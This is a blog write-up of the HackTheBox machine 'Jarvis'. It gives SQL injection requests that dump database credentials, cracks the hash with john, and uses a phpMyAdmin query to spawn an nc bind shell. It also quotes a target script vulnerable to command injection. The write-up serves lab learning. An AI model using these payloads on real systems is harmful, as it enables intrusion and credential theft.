<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="As always, run an nmap scan: 12345$ nmap -A 10.10.10.135PORT   STATE SERVICE VERSION22&#x2F;tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)80&#x2F;tcp open  http    Apache httpd 2.4.25">
<meta property="og:type" content="article">
<meta property="og:title" content="Jarvis">
<meta property="og:url" content="http://tcmal.xyz/jarvis/index.html">
<meta property="og:site_name" content="tcmal">
<meta property="og:description" content="As always, run an nmap scan: 12345$ nmap -A 10.10.10.135PORT   STATE SERVICE VERSION22&#x2F;tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)80&#x2F;tcp open  http    Apache httpd 2.4.25">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-01-08T00:00:00.000Z">
<meta property="article:modified_time" content="2020-11-26T11:48:41.484Z">
<meta property="article:author" content="tcmal">
<meta property="article:tag" content="Infosec">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Exploit">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Jarvis</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/archives/">Recent</a></li>
         
          <li><a href="https://github.com/tcmal" target="_blank" rel="noopener">GitHub</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/unredact-threatening-document/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://tcmal.xyz/jarvis/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://tcmal.xyz/jarvis/&text=Jarvis" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://tcmal.xyz/jarvis/&title=Jarvis" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://tcmal.xyz/jarvis/&is_video=false&description=Jarvis" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Jarvis&body=Check out this article: http://tcmal.xyz/jarvis/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://tcmal.xyz/jarvis/&title=Jarvis" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://tcmal.xyz/jarvis/&title=Jarvis" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://tcmal.xyz/jarvis/&title=Jarvis" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://tcmal.xyz/jarvis/&title=Jarvis" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://tcmal.xyz/jarvis/&name=Jarvis&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://tcmal.xyz/jarvis/&t=Jarvis" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Jarvis
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">tcmal</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-01-08T00:00:00.000Z" itemprop="datePublished">2020-01-08</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/HackTheBox/">HackTheBox</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Exploit/" rel="tag">Exploit</a>, <a class="tag-link" href="/tags/Infosec/" rel="tag">Infosec</a>, <a class="tag-link" href="/tags/Web/" rel="tag">Web</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>As always, run an nmap scan:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -A 10.10.10.135</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-title: Stark Hotel</span><br></pre></td></tr></table></figure>
<p>(trimmed)</p>
<p>Looking at the web server available, it’s a simple listing page for a hotel. When you click a room, it takes you to <code>/room.php?cod=x</code> where x is presumably the room ID.</p>
<p>If you replace x with a string or an invalid id, the same page returns but all fields are blank. You can do a quick test for SQL injection with the following request:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;room.php?cod&#x3D;999 OR 1&#x3D;1;#</span><br></pre></td></tr></table></figure>

<p>999 is an invalid ID (we assume), but we still get a room returned and shown to us, meaning this is vulnerable.</p>
<p>Since we’re shown whatever the first row returned is, a <code>UNION select</code> should let us view any data we want with the right conditions. First, we need to match up the right amount of columns.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;room.php?cod&#x3D;999 UNION SELECT 1,1,1,1; #</span><br><span class="line">GET &#x2F;room.php?cod&#x3D;999 UNION SELECT 1,1,1,1,1; #</span><br><span class="line">GET &#x2F;room.php?cod&#x3D;999 UNION SELECT 1,1,1,1,1,1; #</span><br><span class="line">GET &#x2F;room.php?cod&#x3D;999 UNION SELECT 1,1,1,1,1,1,1; #</span><br><span class="line">^^^ this one works</span><br></pre></td></tr></table></figure>

<p>We get a similar page, but the price, name etc is all 1. Let’s start by enumerating the databases:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;room.php?cod&#x3D;0 UNION SELECT 1,GROUP_CONCAT(schema_name),1,1,1,1,1 FROM information_schema.schemata; #</span><br></pre></td></tr></table></figure>

<p>For me, this set the name of the room to <code>aaa,hotel,information_schema,mysql,performance_schema</code>. We miss the first column because the id isn’t directly visible in our page, and though it is reflected back at us through the image URL, it’s easier to have it shown directly. <code>aaa</code> is a weird name, so it’s probably someone else and not part of the box. It’s safe to say the <code>hotel</code> database drives this website.</p>
<p>We can now start to look at the tables in our database:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;room.php?cod&#x3D;0 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),1,1,1,1,1 FROM information_schema.tables; #</span><br></pre></td></tr></table></figure>

<p>This gives us <code>room,ALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS...</code>. So it looks like our database is just the one table and then the default mysql stuff.</p>
<p>What might be more useful though, is some credentials. We can access the <code>mysql.users</code> table just like any other, and dump the first username and password hash:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;room.php?cod&#x3D;0 UNION SELECT 1,User,Password,1,1,1,1 FROM mysql.user; #</span><br></pre></td></tr></table></figure>

<p>All this could’ve been done much more easily using <code>sqlmap</code>, but it’s good to do it yourself sometimes. From this, we get something we can throw into john, or any other tool:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ john passwd</span><br><span class="line">Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 128&#x2F;128 SSE2 4x])</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Proceeding with wordlist:&#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst, rules:Wordlist</span><br><span class="line"></span><br><span class="line">imissyou         (DBadmin)</span><br><span class="line"></span><br><span class="line">1g 0:00:00:00 DONE 2&#x2F;3 (2019-09-14 20:50) 1.960g&#x2F;s 6617p&#x2F;s 6617c&#x2F;s 6617C&#x2F;s twilight..ashlee</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>(trimmed)</p>
<p>For context, the hash is in a format particular to MySql &gt; 4.1, with the * being used to specify that it’s a newer version.</p>
<p>Now what? Well, whether you run dirb on the web root or just guess you should quickly find the phpMyAdmin installation which we can now access.</p>
<p>Now we need to get actual code execution. From the phpMyAdmin root, you can find a <code>README.md</code> file which states that it’s running version 4.8.0. We can easily search for exploits and find <a href="https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/" target="_blank" rel="noopener">this</a> very well written guide. We could make a metasploit payload, and in most real-world situations we’d need to, but we can also try a much simpler approach:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php echo exec(&#39;nc -lvp 4444 -e &#x2F;bin&#x2F;bash&#39;); ?&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>This will create a bash shell bound to port 4444. Run it and sure enough, we can connect.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">www-data</span><br><span class="line">$ cat &#x2F;etc&#x2F;passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pepper:x:1000:1000:,,,:&#x2F;home&#x2F;pepper:&#x2F;bin&#x2F;bash</span><br><span class="line">(trimmed)</span><br></pre></td></tr></table></figure>

<p>So while we have <em>a</em> shell, it’s likely pepper is the real user target. Let’s do our normal enum of processes:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ps -aux</span><br><span class="line">	USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root          1  0.2  0.6 138984  6820 ?        Ss   15:39   0:08 &#x2F;sbin&#x2F;init</span><br><span class="line">root        562  0.0  2.5 271396 25648 ?        Ss   15:39   0:00 &#x2F;usr&#x2F;sbin&#x2F;apache2 -k start</span><br><span class="line">www-data    917  0.0  0.3  18228  3376 pts&#x2F;0    Ss+  15:45   0:00 &#x2F;bin&#x2F;bash</span><br><span class="line">root       1027  0.0  0.3  47608  3204 ?        S    16:02   0:00 sudo -u pepper &#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py -p</span><br><span class="line">pepper     1028  0.0  0.9  26040  9128 ?        S    16:02   0:00 python3 &#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py -p</span><br><span class="line">www-data   2203  0.0  0.0   4276   768 ?        S    16:26   0:00 sh -c nc -lvp 4444 -e &#x2F;bin&#x2F;bash</span><br><span class="line">www-data   2204  0.0  0.2  17940  2840 ?        S    16:26   0:00 bash</span><br><span class="line">www-data   2312  0.0  0.2  36632  2856 ?        R    16:27   0:00 ps -aux</span><br></pre></td></tr></table></figure>

<p>(trimmed)</p>
<p>We see everything we’d expect: kernel threads, the http server and the shell we’re on, but also a call to sudo which runs this python script as a target. Here’s the source for that script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> listdir</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_help</span><span class="params">()</span>:</span></span><br><span class="line">    message=<span class="string">'''</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Simpler   -   A simple simplifier ;)                 *</span></span><br><span class="line"><span class="string">* Version 1.0                                          *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">Usage:  python3 simpler.py [options]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Options:</span></span><br><span class="line"><span class="string">    -h/--help   : This help</span></span><br><span class="line"><span class="string">    -s          : Statistics</span></span><br><span class="line"><span class="string">    -l          : List the attackers IP</span></span><br><span class="line"><span class="string">    -p          : ping an attacker IP</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_header</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'''***********************************************</span></span><br><span class="line"><span class="string">     _                 _                       </span></span><br><span class="line"><span class="string"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ </span></span><br><span class="line"><span class="string">/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |</span></span><br><span class="line"><span class="string">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |</span></span><br><span class="line"><span class="string">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |</span></span><br><span class="line"><span class="string">                |_|               |_|    |___/ </span></span><br><span class="line"><span class="string">                                @ironhackers.es</span></span><br><span class="line"><span class="string">                                </span></span><br><span class="line"><span class="string">***********************************************</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_statistics</span><span class="params">()</span>:</span></span><br><span class="line">    path = <span class="string">'/home/pepper/Web/Logs/'</span></span><br><span class="line">    print(<span class="string">'Statistics\n-----------'</span>)</span><br><span class="line">    listed_files = listdir(path)</span><br><span class="line">    count = len(listed_files)</span><br><span class="line">    print(<span class="string">'Number of Attackers: '</span> + str(count))</span><br><span class="line">    level_1 = <span class="number">0</span></span><br><span class="line">    dat = datetime(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    ip_list = []</span><br><span class="line">    reks = []</span><br><span class="line">    ip = <span class="string">''</span></span><br><span class="line">    req = <span class="string">''</span></span><br><span class="line">    rek = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> listed_files:</span><br><span class="line">        f = open(path + i, <span class="string">'r'</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        level2, rek = get_max_level(lines)</span><br><span class="line">        fecha, requ = date_to_num(lines)</span><br><span class="line">        ip = i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> fecha &gt; dat:</span><br><span class="line">            dat = fecha</span><br><span class="line">            req = requ</span><br><span class="line">            ip2 = i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> int(level2) &gt; int(level_1):</span><br><span class="line">            level_1 = level2</span><br><span class="line">            ip_list = [ip]</span><br><span class="line">            reks=[rek]</span><br><span class="line">        <span class="keyword">elif</span> int(level2) == int(level_1):</span><br><span class="line">            ip_list.append(ip)</span><br><span class="line">            reks.append(rek)</span><br><span class="line">        f.close()</span><br><span class="line">	</span><br><span class="line">    print(<span class="string">'Most Risky:'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(ip_list) &gt; <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'More than 1 ip found'</span>)</span><br><span class="line">    cont = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ip_list:</span><br><span class="line">        print(<span class="string">'    '</span> + i + <span class="string">' - Attack Level : '</span> + level_1 + <span class="string">' Request: '</span> + reks[cont])</span><br><span class="line">        cont = cont + <span class="number">1</span></span><br><span class="line">	</span><br><span class="line">    print(<span class="string">'Most Recent: '</span> + ip2 + <span class="string">' --&gt; '</span> + str(dat) + <span class="string">' '</span> + req)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_ip</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Attackers\n-----------'</span>)</span><br><span class="line">    path = <span class="string">'/home/pepper/Web/Logs/'</span></span><br><span class="line">    listed_files = listdir(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> listed_files:</span><br><span class="line">        f = open(path + i,<span class="string">'r'</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        level,req = get_max_level(lines)</span><br><span class="line">        print(i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>] + <span class="string">' - Attack Level : '</span> + level)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">date_to_num</span><span class="params">(lines)</span>:</span></span><br><span class="line">    dat = datetime(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">    ip = <span class="string">''</span></span><br><span class="line">    req=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Level'</span> <span class="keyword">in</span> i:</span><br><span class="line">            fecha=(i.split(<span class="string">' '</span>)[<span class="number">6</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">7</span>]).split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line">            regex = <span class="string">'(\d+)-(.*)-(\d+)(.*)'</span></span><br><span class="line">            logEx=re.match(regex, fecha).groups()</span><br><span class="line">            mes = to_dict(logEx[<span class="number">1</span>])</span><br><span class="line">            fecha = logEx[<span class="number">0</span>] + <span class="string">'-'</span> + mes + <span class="string">'-'</span> + logEx[<span class="number">2</span>] + <span class="string">' '</span> + logEx[<span class="number">3</span>]</span><br><span class="line">            fecha = datetime.strptime(fecha, <span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line">            <span class="keyword">if</span> fecha &gt; dat:</span><br><span class="line">                dat = fecha</span><br><span class="line">                req = i.split(<span class="string">' '</span>)[<span class="number">8</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">9</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">10</span>]</span><br><span class="line">    <span class="keyword">return</span> dat, req</span><br><span class="line">			</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_dict</span><span class="params">(name)</span>:</span></span><br><span class="line">    month_dict = &#123;<span class="string">'Jan'</span>:<span class="string">'01'</span>,<span class="string">'Feb'</span>:<span class="string">'02'</span>,<span class="string">'Mar'</span>:<span class="string">'03'</span>,<span class="string">'Apr'</span>:<span class="string">'04'</span>, <span class="string">'May'</span>:<span class="string">'05'</span>, <span class="string">'Jun'</span>:<span class="string">'06'</span>,<span class="string">'Jul'</span>:<span class="string">'07'</span>,<span class="string">'Aug'</span>:<span class="string">'08'</span>,<span class="string">'Sep'</span>:<span class="string">'09'</span>,<span class="string">'Oct'</span>:<span class="string">'10'</span>,<span class="string">'Nov'</span>:<span class="string">'11'</span>,<span class="string">'Dec'</span>:<span class="string">'12'</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> month_dict[name]</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_max_level</span><span class="params">(lines)</span>:</span></span><br><span class="line">    level=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Level'</span> <span class="keyword">in</span> j:</span><br><span class="line">            <span class="keyword">if</span> int(j.split(<span class="string">' '</span>)[<span class="number">4</span>]) &gt; int(level):</span><br><span class="line">                level = j.split(<span class="string">' '</span>)[<span class="number">4</span>]</span><br><span class="line">                req=j.split(<span class="string">' '</span>)[<span class="number">8</span>] + <span class="string">' '</span> + j.split(<span class="string">' '</span>)[<span class="number">9</span>] + <span class="string">' '</span> + j.split(<span class="string">' '</span>)[<span class="number">10</span>]</span><br><span class="line">    <span class="keyword">return</span> level, req</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_ping</span><span class="params">()</span>:</span></span><br><span class="line">    forbidden = [<span class="string">'&amp;'</span>, <span class="string">';'</span>, <span class="string">'-'</span>, <span class="string">'`'</span>, <span class="string">'||'</span>, <span class="string">'|'</span>]</span><br><span class="line">    command = input(<span class="string">'Enter an IP: '</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> forbidden:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            print(<span class="string">'Got you'</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">'ping '</span> + command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    show_header()</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'-h'</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">'--help'</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-s'</span>:</span><br><span class="line">        show_statistics()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-l'</span>:</span><br><span class="line">        list_ip()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-p'</span>:</span><br><span class="line">        exec_ping()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>

<p>We see the -p flag, which our sudo process was using, passes input to a command. Whilst it may filter out some characters, it’s still vulnerable to command injection.</p>
